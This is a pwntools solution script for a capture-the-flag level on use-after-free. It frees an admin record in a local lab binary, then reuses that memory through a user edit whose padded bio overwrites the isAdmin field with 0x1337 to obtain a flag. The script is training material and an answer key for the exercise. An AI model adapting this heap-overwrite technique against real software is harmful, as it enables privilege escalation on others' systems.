#!/usr/bin/env python3
"""
Level 2: Use-After-Free - Solution
目标：修改已释放的admin用户，使admin->isAdmin = 0x1337
"""

from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

def solve():
    p = process('/root/code/safe/build/level02_uaf/l2_vuln')

    # User结构：
    # username[32] + bio[64] + isAdmin(4)

    # 步骤1：释放admin（选择1）
    p.sendlineafter(b'> ', b'1')
    p.recvuntil(b'Admin freed')

    # 步骤2：编辑user，重用释放的admin内存
    # bio需要填充64字节，然后设置isAdmin为0x1337
    username = b'A' * 31  # 限制31字符
    bio = b'B' * 64 + p32(0x1337)  # bio填充 + isAdmin

    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'username: ', username)
    p.sendlineafter(b'bio: ', bio)

    # 步骤3：打印admin info（触发UAF检查）
    p.sendlineafter(b'> ', b'3')

    output = p.recvall(timeout=2).decode('utf-8', errors='ignore')
    print(output)

    if 'Flag:' in output or 'Congratulations' in output:
        log.success("Level 2 解题成功！")
        return True
    else:
        log.failure("Level 2 解题失败")
        return False

if __name__ == '__main__':
    solve()
